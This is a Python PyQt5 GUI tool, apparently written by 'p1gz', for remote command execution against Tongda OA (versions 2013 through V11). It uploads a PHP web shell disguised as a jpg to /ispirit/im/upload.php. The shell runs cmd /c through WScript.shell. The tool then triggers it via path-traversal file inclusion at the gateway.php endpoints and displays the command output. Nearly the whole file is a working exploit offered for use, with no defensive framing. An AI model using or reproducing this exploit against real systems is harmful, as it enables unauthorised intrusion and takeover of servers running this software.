# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file '通达OA命令执行（文件包含）.ui'
#
# Created by: PyQt5 UI code generator 5.13.0
#
# WARNING! All changes made in this file will be lost!


from PyQt5 import QtCore, QtGui, QtWidgets
import requests
import re
import sys


class Ui_mainWindow(object):
    def setupUi(self, mainWindow):
        mainWindow.setObjectName("mainWindow")
        mainWindow.resize(646, 482)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("2222.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        mainWindow.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(mainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(30, 40, 101, 16))
        self.label.setObjectName("label")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(110, 40, 311, 20))
        self.lineEdit.setObjectName("lineEdit")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(440, 40, 75, 23))
        self.pushButton.setObjectName("pushButton")
        self.textBrowser = QtWidgets.QTextBrowser(self.centralwidget)
        self.textBrowser.setGeometry(QtCore.QRect(110, 130, 411, 161))
        self.textBrowser.setObjectName("textBrowser")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(30, 130, 54, 12))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(110, 300, 261, 121))
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(30, 80, 71, 16))
        self.label_4.setObjectName("label_4")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_2.setGeometry(QtCore.QRect(110, 80, 311, 20))
        self.lineEdit_2.setObjectName("lineEdit_2")
        mainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(mainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 646, 23))
        self.menubar.setObjectName("menubar")
        mainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(mainWindow)
        self.statusbar.setObjectName("statusbar")
        mainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(mainWindow)
        QtCore.QMetaObject.connectSlotsByName(mainWindow)

    def retranslateUi(self, mainWindow):
        _translate = QtCore.QCoreApplication.translate
        mainWindow.setWindowTitle(_translate("mainWindow", "通达OA命令执行by:p1gz"))
        self.label.setText(_translate("mainWindow", "请输入URL："))
        self.pushButton.setText(_translate("mainWindow", "Go!"))
        self.label_2.setText(_translate("mainWindow", "回显结果："))
        self.label_3.setText(_translate("mainWindow", "^.^影响版本： \n"
" - V 11版 \n"
" - 2017版 \n"
" - 2016版 \n"
" - 2015版 \n"
" - 2013增强版 \n"
" - 2013版"))
        self.label_4.setText(_translate("mainWindow", "输入命令："))
        self.pushButton.clicked.connect(self.show_messagebox)

    def show_messagebox(self):
        self.textBrowser.clear()
        curs=self.textBrowser.textCursor()
        url=self.lineEdit.text()
        cmd=self.lineEdit_2.text()

        if 'http://' in url or 'https://' in url:
            if len(url)!=0:
                try:
                    cookies = {"PHPSESSID": "123"}
                    headers = {"Cache-Control": "no-cache",
                               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
                               "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB",
                               "Accept": "*/*", "Accept-Encoding": "gzip, deflate",
                               "Accept-Language": "zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5",
                               "Connection": "close"}
                    data = "------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n2\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n123\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['cmd'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB--\r\n"
                    url2 = url + '/ispirit/im/upload.php'
                    cmd2 = cmd
                    print(cmd)
                    #try:
                    res = requests.post(url2, headers=headers, cookies=cookies, data=data)
                    # print(res.text)
                    if 'OK' in res.text:
                        pattern = re.compile('\d+\_\d+')
                        name = pattern.findall(res.text)[0].replace('_', '/') + '.jpg'
                        # print(name)
                        url3 = url + '/ispirit/interface/gateway.php'
                        url4 = url + '/mac/gateway.php'
                        headers2 = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate", "Accept": "*/*",
                                    "User-Agent": "python-requests/2.21.0",
                                    "Content-Type": "application/x-www-form-urlencoded"}
                        data2 = r'json={"url":"/general/../../attach/im/' + name + '"}&cmd=' + cmd2
                        # print(data2)
                        try:
                            res2 = requests.post(url3, headers=headers2, data=data2)
                            #print(url2 + '  result' + '\n' + res2.text)
                            curs.insertText('路径1回显结果：'+str(res2.text))
                            res3 = requests.post(url4, headers=headers2, data=data2)
                            #print(url3 + '  result' + '\n' + res3.text)
                            curs.insertText('路径2回显结果：'+str(res3.text))
                        except:
                            pass
                    #except:
                       # pass

                except:
                    QtWidgets.QMessageBox.question(self.pushButton,"出错了","目标地址不能为空！",QtWidgets.QMessageBox.yes)
            else:
                pass
        else:
            print('在url加上http://或https://')



if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_mainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())